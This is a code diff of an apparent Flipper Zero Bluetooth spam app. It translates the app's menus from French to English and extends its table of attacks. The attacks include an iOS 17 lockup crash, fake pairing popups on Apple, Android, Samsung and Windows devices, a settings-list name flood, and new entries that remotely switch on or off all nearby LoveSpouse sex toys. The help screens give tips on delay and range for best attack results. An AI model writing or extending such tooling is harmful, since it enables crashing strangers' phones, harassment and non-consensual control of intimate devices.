@@ -15,8 +15,8 @@
 
 static Attack attacks[] = {
     {
-        .title = "La panoplie complète",
-        .text = "Attaques simultanées",
+        .title = "The Kitchen Sink",
+        .text = "Flood all attacks at once",
         .protocol = NULL,
         .payload =
             {
@@ -25,8 +25,18 @@ static Attack attacks[] = {
             },
     },
     {
-        .title = "iOS 17 Chaos",
-        .text = "iPhones récents, long",
+        .title = "BT Settings Flood",
+        .text = "Fills available BT devices",
+        .protocol = &protocol_nameflood,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg.nameflood = {},
+            },
+    },
+    {
+        .title = "iOS 17 Lockup Crash",
+        .text = "Newer iPhones, long range",
         .protocol = &protocol_continuity,
         .payload =
             {
@@ -38,8 +48,8 @@ static Attack attacks[] = {
             },
     },
     {
-        .title = "Action Modale Apple",
-        .text = "Verrou. en attente, long",
+        .title = "Apple Action Modal",
+        .text = "Lock cooldown, long range",
         .protocol = &protocol_continuity,
         .payload =
             {
@@ -51,8 +61,8 @@ static Attack attacks[] = {
             },
     },
     {
-        .title = "Pop-up  Apple",
-        .text = "Aucune attente, court",
+        .title = "Apple Device Popup",
+        .text = "No cooldown, close range",
         .protocol = &protocol_continuity,
         .payload =
             {
@@ -64,8 +74,8 @@ static Attack attacks[] = {
             },
     },
     {
-		.title = "Connexion Android",
-        .text = "Attend Reboot, long",
+        .title = "Android Device Connect",
+        .text = "Reboot cooldown, long range",
         .protocol = &protocol_fastpair,
         .payload =
             {
@@ -74,8 +84,8 @@ static Attack attacks[] = {
             },
     },
     {
-        .title = "Popup Samsung Buds",
-        .text = "Aucune attente, long",
+        .title = "Samsung Buds Popup",
+        .text = "No cooldown, long range",
         .protocol = &protocol_easysetup,
         .payload =
             {
@@ -88,7 +98,7 @@ static Attack attacks[] = {
     },
     {
         .title = "Samsung Watch Pair",
-        .text = "Aucune attente, long",
+        .text = "No cooldown, long range",
         .protocol = &protocol_easysetup,
         .payload =
             {
@@ -100,13 +110,39 @@ static Attack attacks[] = {
             },
     },
     {
-        .title = "Périphérique Windows trouvé",
-       .text = "Aucune attente, court",
+        .title = "Windows Device Found",
+        .text = "No cooldown, short range",
         .protocol = &protocol_swiftpair,
         .payload =
             {
                 .random_mac = true,
                 .cfg.swiftpair = {},
+            },
+    },
+    {
+        .title = "Vibrate 'em All",
+        .text = "Activate all LoveSpouse toys",
+        .protocol = &protocol_lovespouse,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg.lovespouse =
+                    {
+                        .state = LovespouseStatePlay,
+                    },
+            },
+    },
+    {
+        .title = "Denial of Pleasure",
+        .text = "Disable all LoveSpouse toys",
+        .protocol = &protocol_lovespouse,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg.lovespouse =
+                    {
+                        .state = LovespouseStateStop,
+                    },
             },
     },
 };
@@ -193,6 +229,9 @@ static int32_t adv_thread(void* _ctx) {
     const Protocol* protocol = attacks[state->index].protocol;
     if(!payload->random_mac) randomize_mac(state);
     if(state->ctx.led_indicator) start_blink(state);
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
+    }
 
     while(state->advertising) {
         if(protocol && payload->mode == PayloadModeBruteforce &&
@@ -205,7 +244,7 @@ static int32_t adv_thread(void* _ctx) {
         start_extra_beacon(state);
 
         furi_thread_flags_wait(true, FuriFlagWaitAny, delays[state->delay]);
-        furi_hal_bt_extra_beacon_stop();
+        furi_check(furi_hal_bt_extra_beacon_stop());
     }
 
     if(state->ctx.led_indicator) stop_blink(state);
@@ -238,21 +277,21 @@ enum {
 
 static void draw_callback(Canvas* canvas, void* _ctx) {
     State* state = *(State**)_ctx;
-    const char* back = "Retour";
-    const char* next = "Suivant";
+    const char* back = "Back";
+    const char* next = "Next";
     if(state->index < 0) {
-        back = "Suivant";
-        next = "Retour";
+        back = "Next";
+        next = "Back";
     }
     switch(state->index) {
     case PageStart - 1:
         next = "Spam";
         break;
     case PageStart:
-        back = "Aide";
+        back = "Help";
         break;
     case PageEnd:
-        next = "A propos";
+        next = "About";
         break;
     case PageEnd + 1:
         back = "Spam";
@@ -271,82 +310,83 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
     switch(state->index) {
     case PageHelpBruteforce:
         canvas_set_font(canvas, FontBatteryPercent);
-        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Aide");
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             120,
             48,
             AlignLeft,
             AlignTop,
-			"\e#Bruteforce\e# cycles codes\n"
-			"tenir droite=envoie manuel\n"
-			"tenir gauche=chercher \npopups",
+            "\e#Bruteforce\e# cycles codes\n"
+            "to find popups, hold left and\n"
+            "right to send manually and\n"
+            "change delay",
             false);
         break;
     case PageHelpApps:
         canvas_set_font(canvas, FontBatteryPercent);
-        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Aide");
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             120,
             48,
             AlignLeft,
             AlignTop,
-			"\e#Des apps\e# interfèrent\n"
-			"avec les attaques, conseil:\n"
-			"reste à l'écran d'accueil",
+            "\e#Some Apps\e# interfere\n"
+            "with the attacks, stay on\n"
+            "homescreen for best results",
             false);
         break;
     case PageHelpDelay:
         canvas_set_font(canvas, FontBatteryPercent);
-        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Aide");
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             120,
             48,
             AlignLeft,
             AlignTop,
-			"\e#Délai\e# temps entre les\n"
-			"tentatives (haut à droite),\n"
-			"conseil 20ms.",
+            "\e#Delay\e# is time between\n"
+            "attack attempts (top right),\n"
+            "keep 20ms for best results",
             false);
         break;
     case PageHelpDistance:
         canvas_set_font(canvas, FontBatteryPercent);
-        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Aide");
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             120,
             48,
             AlignLeft,
             AlignTop,
-			"\e#Distance\e# varie:\n"
-             "Long (>30m)\n"
-             "Court (<1m)",
+            "\e#Distance\e# varies greatly:\n"
+            "some are long range (>30 m)\n"
+            "others are close range (<1 m)",
             false);
         break;
     case PageHelpInfoConfig:
         canvas_set_font(canvas, FontBatteryPercent);
-        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Aide");
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             120,
             48,
             AlignLeft,
             AlignTop,
-			"\e#Plus d'info\e# changer\n"
-             "\e#les options,\e# maintenir\n"
-             "Ok sur les pages d'attaques",
+            "See \e#more info\e# and change\n"
+            "\e#attack options\e# by holding\n"
+            "Ok on each attack page",
             false);
         break;
     case PageAboutCredits:
@@ -354,16 +394,16 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
         elements_text_box(
             canvas,
-            2,
+            4,
             16,
             122,
             48,
             AlignLeft,
             AlignTop,
-            "App+Spam: \e#WillyJL\e# KZFW\n"
+            "App+Spam: \e#WillyJL\e#\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#5.0\e#",
+            "                                   Version \e#" FAP_VERSION "\e#",
             false);
         break;
     default: {
@@ -401,7 +441,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             elements_slightly_rounded_box(canvas, 3, 14, 30, 10);
             elements_slightly_rounded_box(canvas, 119 - w, 14, 6 + w, 10);
             canvas_invert_color(canvas);
-            canvas_draw_str_aligned(canvas, 5, 22, AlignLeft, AlignBottom, "<Envoie");
+            canvas_draw_str_aligned(canvas, 5, 22, AlignLeft, AlignBottom, "<Send");
             canvas_draw_str_aligned(canvas, 122, 22, AlignRight, AlignBottom, str);
             canvas_invert_color(canvas);
         } else {
@@ -411,7 +451,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
                 "%02i/%02i: %s",
                 state->index + 1,
                 ATTACKS_COUNT,
-                protocol ? protocol->get_name(payload) : "Tout ET");
+                protocol ? protocol->get_name(payload) : "Everything AND");
             canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 22, str);
         }
 
@@ -421,7 +461,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         canvas_set_font(canvas, FontSecondary);
         canvas_draw_str(canvas, 4, 46, attack->text);
 
-        elements_button_center(canvas, state->advertising ? "Stop" : "Go");
+        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
         break;
     }
     }
@@ -436,7 +476,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
     if(state->lock_warning) {
         canvas_set_font(canvas, FontSecondary);
         elements_bold_rounded_frame(canvas, 14, 8, 99, 48);
-        elements_multiline_text(canvas, 65, 26, "Pour Unlock\nappuie:");
+        elements_multiline_text(canvas, 65, 26, "To unlock\npress:");
         canvas_draw_icon(canvas, 65, 42, &I_Pin_back_arrow_10x8);
         canvas_draw_icon(canvas, 80, 42, &I_Pin_back_arrow_10x8);
         canvas_draw_icon(canvas, 95, 42, &I_Pin_back_arrow_10x8);
@@ -452,15 +492,16 @@ static bool input_callback(InputEvent* input, void* _ctx) {
 
     if(state->ctx.lock_keyboard) {
         consumed = true;
-        with_view_model(
-            state->main_view, State * *model, { (*model)->lock_warning = true; }, true);
+        state->lock_warning = true;
         if(state->lock_count == 0) {
+            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
             furi_timer_start(state->lock_timer, 1000);
         }
         if(input->type == InputTypeShort && input->key == InputKeyBack) {
             state->lock_count++;
         }
         if(state->lock_count >= 3) {
+            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
             furi_timer_start(state->lock_timer, 1);
         }
     } else if(
@@ -479,7 +520,9 @@ static bool input_callback(InputEvent* input, void* _ctx) {
                     if(advertising) toggle_adv(state);
                     state->ctx.attack = &attacks[state->index];
                     scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
+                    view_commit_model(view, consumed);
                     scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
+                    return consumed;
                 } else if(input->type == InputTypeShort) {
                     toggle_adv(state);
                 }
@@ -524,13 +567,16 @@ static bool input_callback(InputEvent* input, void* _ctx) {
                 if(!advertising) {
                     Payload* payload = &attacks[state->index].payload;
                     if(input->type == InputTypeLong && !payload->random_mac) randomize_mac(state);
+                    if(furi_hal_bt_extra_beacon_is_active()) {
+                        furi_check(furi_hal_bt_extra_beacon_stop());
+                    }
 
                     start_extra_beacon(state);
 
                     if(state->ctx.led_indicator)
                         notification_message(state->ctx.notification, &solid_message);
                     furi_delay_ms(10);
-                    furi_hal_bt_extra_beacon_stop();
+                    furi_check(furi_hal_bt_extra_beacon_stop());
 
                     if(state->ctx.led_indicator)
                         notification_message_block(state->ctx.notification, &sequence_reset_rgb);
@@ -576,6 +622,7 @@ static void lock_timer_callback(void* _ctx) {
     with_view_model(
         state->main_view, State * *model, { (*model)->lock_warning = false; }, true);
     state->lock_count = 0;
+    furi_timer_set_thread_priority(FuriTimerThreadPriorityNormal);
 }
 
 static void tick_event_callback(void* _ctx) {
